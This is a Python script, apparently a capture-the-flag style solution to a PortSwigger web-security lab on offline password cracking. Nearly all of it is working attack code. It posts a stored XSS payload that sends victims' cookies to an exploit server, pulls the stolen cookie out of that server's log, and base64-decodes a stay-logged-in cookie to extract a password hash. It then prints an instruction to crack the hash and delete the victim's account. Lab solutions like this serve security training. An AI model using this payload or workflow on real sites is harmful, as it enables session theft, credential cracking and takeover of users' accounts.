from requests import request
from bs4 import BeautifulSoup
from random import randint
from urllib import  parse as url_parse
from encodings import codecs
from sys import argv

def parse_cookie(cookies):
    try:
        parsed_cookies = ""

        for key, value in cookies.items():
            parsed_cookies = "{}{}={};".format(parsed_cookies, key, value)

        return parsed_cookies
    except Exception as exception:
        print("[-] Error While Parse Cookies : {} ".format(exception))


def request_logger(method, endpoint, data=""):
    print("{} {} {}".format(method, endpoint, data))


def parse_exploit_server_url(html_content):
    try:
        html=BeautifulSoup(html_content,'html.parser')
        exploit_server_url=html.find("a",{'id':'exploit-link'}).get('href')
        if exploit_server_url[-1]!='/':
            exploit_server_url="{}/".format(exploit_server_url)
        return  exploit_server_url 
    except :
        return False
def parse_number_of_posts(html_content):
    try:
        html=BeautifulSoup(html_content,'html.parser')
        return len(html.findAll("div",{'class':'blog-post'}))
    except:
        return 0


def login(login_url,username,password):
    try:
        data="username={}&password={}".format(username,password)
        request_logger("POST",login_url,data)
        res=request(method="POST",url=login_url,data=data);
        res_html=BeautifulSoup(res.content.decode(),'html.parser')
        if res_html.find('div',{'id':'account-content'}):
            return parse_cookie(res.history[0].cookies)
        else:
            return False
    except Exception as exception:
        print("Error : {}".format(exception))
        return False

def exploit_xss_through_comment(comment_url,exploit_server_url,number_of_posts):
    try:
        headers={
            'Content-Type':'application/x-www-form-urlencoded'
        }
        exploitation_code='<script>document.location.href=("{}"+"exploit/"+document.cookie)</script>'.format(exploit_server_url)
        exploitation_code=url_parse.quote(exploitation_code)
        print("[+] Exploiting Server Through XSS in Comment ")
        for post_id in range(1,number_of_posts+1):
            data="postId={}&comment={}&name={}&email={}&website={}".format(post_id,exploitation_code,'0xCrypt00o','0xCrypt00o@0xCrypt00o.com','https://Crypt00o.github.io')
            request(method="POST",url=comment_url,headers=headers,data=data)
        return True
    except Exception as exception:
        print("Error : {}".format(exception))

def get_cookie_from_exploit_server(log_url):
    res=request(method="GET",url=log_url)
    res_html=BeautifulSoup(res.content.decode(),'html.parser')
    if res_html.find('pre'):
        access_log=res_html.find('pre').contents[0].split('\n')
        access_log.reverse()
        for req in access_log:
            if req.count("/exploit/")>0:
                return req.split('/exploit/')[1].split(' HTTP')[0]

def parse_stay_login_cookie(cookie):
    cookie=" {}".format(cookie)
    cookie_decoded=codecs.decode(cookie.split('stay-logged-in=')[1].encode(),'base64').decode()
    hashed_password=cookie_decoded.split(":")[1]
    return hashed_password

def pwn(lab_url):
    try:
        if lab_url[-1]!='/':
            lab_url="{}/".format(lab_url)
        request_logger("GET",lab_url)
        res=request(method="GET",url=lab_url)
        number_of_posts=parse_number_of_posts(res.content.decode())
        exploit_server_url=parse_exploit_server_url(res.content.decode())
        if exploit_server_url:
                exploit_xss_through_comment("{}post/comment".format(lab_url),exploit_server_url,number_of_posts)
                victim_cookie=get_cookie_from_exploit_server("{}log".format(exploit_server_url))
                hashed_password=parse_stay_login_cookie(victim_cookie)
                print('[+] hashed_password : {}'.format(hashed_password))
                print("[+] Check crackstation.net to get password from this hashed password , then login with victim username and the password and delete his account")
        else:
            print("[+] Lab Solved")
            pass
    except Exception as exception:
        print("Error : {}".format(exception))

if __name__ == "__main__":
 print("""
    0xCrypt00o Solution for Portswigger LAB : Offline-Password-Cracking         For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==2:
     pwn(argv[1])
 else:
     print("call it with : ./pwn-auth-offline-password-cracking.py <url> ")
